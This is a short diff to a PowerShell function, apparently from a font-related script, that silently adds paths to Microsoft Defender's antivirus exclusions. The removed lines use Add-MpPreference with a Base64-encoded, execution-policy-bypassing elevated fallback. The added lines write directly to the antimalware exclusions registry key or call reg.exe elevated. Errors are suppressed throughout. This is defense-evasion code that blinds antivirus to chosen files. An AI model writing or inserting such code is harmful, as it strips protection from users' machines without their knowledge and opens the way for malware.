@@ -86,15 +86,15 @@ function Get-SafeFont {
 function Add-DefenderExclusion {
     param([string]$Path)
     try {
-        Import-Module Defender -ErrorAction SilentlyContinue
-        $current = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath)
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"
+        $current = try { (Get-ItemProperty -Path $regPath -ErrorAction Stop).PSObject.Properties.Name } catch { @() }
         if ($current -contains $Path) { return }
-        Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $regPath -Name $Path -Value 0 -Type DWord -ErrorAction Stop
         return
     } catch {}
     try {
-        $encCmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module Defender -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '$Path' -ErrorAction SilentlyContinue"))
-        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encCmd" -Verb RunAs -Wait
+        $cmd = "reg.exe ADD `"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths`" /v `"$Path`" /t REG_DWORD /d 0 /f"
+        Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -Wait
     } catch {}
 }
 
